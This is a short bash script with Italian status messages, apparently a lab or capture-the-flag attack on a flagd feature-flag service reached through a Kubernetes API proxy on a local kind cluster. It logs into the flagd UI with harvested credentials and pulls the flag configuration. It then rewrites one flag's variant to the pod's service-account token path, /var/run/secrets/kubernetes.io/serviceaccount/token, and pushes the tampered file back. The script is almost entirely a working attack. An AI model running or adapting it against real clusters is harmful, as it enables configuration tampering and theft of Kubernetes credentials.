#!/usr/bin/env bash
set -euo pipefail

# ===== Config =====
API_SERVER="${1:-https://kind-cluster-control-plane:6443}"
FNPROTO="${2:-/tmp/demo.proto}"
FNCREDS="${3:-/tmp/credentials}"
COOKIEJAR="${4:-/tmp/flagd_ui_cookies.txt}"
NAMESPACE="${5:-mem}"
SERVICE="${6:-flagd}"
PORT="${7:-4000}"
TARGET_FLAG1="${8:-cryptoWord}"
TARGET_FLAG2="${9:-exposedPath}"

PROXY_UI="$API_SERVER/api/v1/namespaces/$NAMESPACE/services/$SERVICE:$PORT/proxy"
FILE_CONFIG="/tmp/flagd-config"

echo "Login a flagd"
mapfile -t CREDS < $FNCREDS
UI_USER="${CREDS[1]}"
UI_PASS="${CREDS[0]}"
curl -k -c "$COOKIEJAR" -sS -X POST "$PROXY_UI/feature/api/login" \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"$UI_USER\",\"password\":\"$UI_PASS\"}"

echo "Prendo il file di configurazione"
COOKIE=$(awk '!/^#/ && $6!="" {print $6"="$7}' "$COOKIEJAR")
curl -k -sS \
  -H "Cookie: $COOKIE" \
  "$PROXY_UI/feature/api/read-file" | jq . > $FILE_CONFIG

echo "Modifico $TARGET_FLAG1 e $TARGET_FLAG2"
jq \
  --arg f "$TARGET_FLAG1" \
  --arg f2 "$TARGET_FLAG2" \
  '(.flags[$f].defaultVariant = "empty") 
   | (.flags[$f2].variants.log = "/var/run/secrets/kubernetes.io/serviceaccount/token")' \
  "$FILE_CONFIG" > "${FILE_CONFIG}.new"
mv "${FILE_CONFIG}.new" "$FILE_CONFIG"
  
curl -sSk -X POST "$PROXY_UI/feature/api/write-to-file" \
  -H "Cookie: $COOKIE" \
  -H "Content-Type: application/json" \
  --data "{\"data\": $(cat "$FILE_CONFIG")}"